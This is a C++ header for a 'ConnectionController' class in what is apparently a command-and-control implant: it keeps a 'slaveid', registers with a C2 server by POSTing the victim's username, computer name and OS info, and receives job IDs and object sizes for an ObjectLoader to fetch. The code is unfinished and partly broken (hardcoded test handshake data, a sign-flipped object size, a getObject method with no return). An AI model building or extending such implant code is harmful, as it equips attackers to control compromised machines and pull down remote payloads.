#include "stdafx.h"

#include "HttpRequest.hpp"
#include "JSONParser.h"
#include "C2Config.h"
#include "ServerResponse.h"

using namespace std;

#ifndef CONNECTION_CONTROLLER_H
#define CONNECTION_CONTROLLER_H

class ConnectionController {
private:
    const char* slaveid = "FAKE_ID";
    string computername, username, osInfo;
    string JOB_ID = "NO_JOB";
    int OBJECT_SIZE = 0;

    json::JSON httpPOST(const char* URL, const char* body) {
        try {
            http::Request requestPOST{URL};
            const auto response = requestPOST.send("POST", body, {
                {"Content-Type", "application/json"}
            });
            return json::parse(string{response.body.begin(), response.body.end()});
        } catch (const std::exception e) {
            return json::null();
        }
    }

    json::JSON httpGET(const char* URL) {

        try {
            http::Request requestGET(URL);
            const auto response = requestGET.send("GET");
            return json:: parse(string{response.body.begin(), response.body.end()});

        } catch (const std::exception e) {

            return json::null();
        }  
    }

    const char* prepareHandShakeBody() {

        // const char* templateStr = "{\"username\":\"%s\", \"computername\":\"%s\", \"info\":\"%s\", \"slaveId\":\"%s\"}";

        // int strSize = strlen(templateStr) + this->computerinfo.length() + 
        //     this->username.length() + this->computername.length();
            
        // printf("String size: %d\n", strSize);
            
        // char *body = new char[strSize];
        // snprintf(body, strSize, templateStr, this->username.c_str(), 
        //     this->computername.c_str(), this->computerinfo.c_str(), this->slaveId.c_str());


        return "{\"username\":\"tommy\", \"computername\":\"tommy's computer\", \"info\":\"LINUX\", \"id\":\"e1896e80-c325-11ed-b033-f5252f300cfa\"}";
    }

    
public:
    ConnectionController(const char* id) {
        this->slaveid = id;
    }

    void prepareConnection(string computername, string username, string osInfo) {
        this->computername = computername;
        this->username = username;
        this->osInfo = osInfo;
    }

    bool handShake() {

        printf("Perform handshake with C2 server with ID %s\n", this->slaveid);
        json::JSON responseBody = httpPOST(URL_INIT, prepareHandShakeBody());
        if (responseBody.size() <= 0) {
            return false;
        }

        // Get the status code from response.
        int code = json::getInt("code", responseBody);
        if (code == RESPONSE_NEW_OBJECT) {
            // Parse the job ID and object size.
            this->JOB_ID = json::getStr("id", responseBody);
            this->OBJECT_SIZE = - json::getInt("size", responseBody);
        }

        return code;    
    }

    bool getObject(ObjectLoader *loader) {

        if (this->OBJECT_SIZE <= 0 || this->JOB_ID.length() == 0) {
            printf("No job currently!\n");
            return false;
        }

        
    }
};

#endif // !~ CONNECTION_CONTROLLER_H 